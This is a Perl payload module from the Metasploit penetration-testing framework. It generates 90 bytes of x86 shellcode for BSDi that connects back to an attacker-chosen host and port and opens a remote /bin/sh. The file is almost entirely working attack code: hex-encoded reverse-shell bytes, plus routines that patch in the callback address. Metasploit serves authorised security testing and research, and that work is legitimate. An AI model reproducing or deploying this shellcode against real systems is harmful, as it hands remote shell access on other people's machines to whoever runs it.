
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdix86_reverse;

use strict;
use base 'Msf::PayloadComponent::ReverseConnection';

my $info =
{
	'Name'         => 'bsdix86reverse',
	'Version'      => '$Revision$',
	'Description'  => 'Connect back to attacker and spawn a shell',
	'Authors'      => [ 'skape <mmiller [at] hick.org>', ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'bsdi' ],
	'Size'         => '',
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };

	$hash = $class->MergeHash($hash, {'Info' => $info});

	my $self = $class->SUPER::new($hash, @_);
	
	$self->_Info->{'Size'} = $self->_GenSize;

	return $self;
}

sub Build 
{
	my $self = shift;

	return $self->Generate($self->GetVar('LHOST'), 
	                       $self->GetVar('LPORT'));
}

sub Generate 
{
	my $self = shift;
	my $host = shift;
	my $port = shift;
	my $host_bin = gethostbyname($host);
	my $port_bin = pack('n', $port);
	my $off_host = 16;
	my $off_port = 23;
  
	my $shellcode = # 90 byte reverse connect
	  "\xeb\x44\x5f\x31\xc9\x51\x41\x51\x41\x51\x6a\x61\x58\xff\xd7\x68" .
	  "\x0a\xfe\x00\x02\x68\x10\x02\x11\x5c\x89\xe3\x6a\x10\x53\x50\x6a" .
	  "\x62\x58\xff\xd7\x5e\xb0\x5a\x51\x56\xff\xd7\x49\x79\xf7\x50\x68" .
	  "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50" .
	  "\x51\x53\xb0\x3b\xff\xd7\xe8\xb7\xff\xff\xff\x68\x07\x00\xc3\x90" .
	  "\x31\xd2\x52\x68\x5a\x5a\x5a\x9a\x54\xc3";

	substr($shellcode, $off_host, 4, $host_bin);
	substr($shellcode, $off_port, 2, $port_bin);
  
	return $shellcode;
}

sub _GenSize 
{
	my $self = shift;
	
	return length($self->Generate('127.0.0.1', 4444));
}

1;
